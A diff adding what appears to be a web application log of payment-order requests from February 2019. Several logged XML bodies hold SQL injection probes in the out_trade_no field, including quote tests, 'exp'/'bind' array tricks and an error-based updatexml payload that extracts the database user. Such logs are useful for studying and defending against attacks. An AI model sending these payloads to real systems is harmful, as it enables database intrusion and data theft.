@@ -1,0 +1,18 @@
+执行日期：20190228141045
+
+执行日期：20190228152520
+
+执行日期：20190228152639
+<object><out_trade_no>exp</out_trade_no><out_trade_no>=1'</out_trade_no></object>
+执行日期：20190228152734
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=1'</out_trade_no></object>
+执行日期：20190228152850
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=1  and updatexml(2,concat(0x7e,user()),0)</out_trade_no></object>
+执行日期：20190228152854
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=1 and updatexml(2,concat(0x7e,user()),0)</out_trade_no></object>
+执行日期：20190228160922
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=0</out_trade_no></object>
+执行日期：20190228160924
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=0</out_trade_no></object>
+执行日期：20190228160926
+<object><out_trade_no>bind</out_trade_no><out_trade_no>=0'</out_trade_no></object>
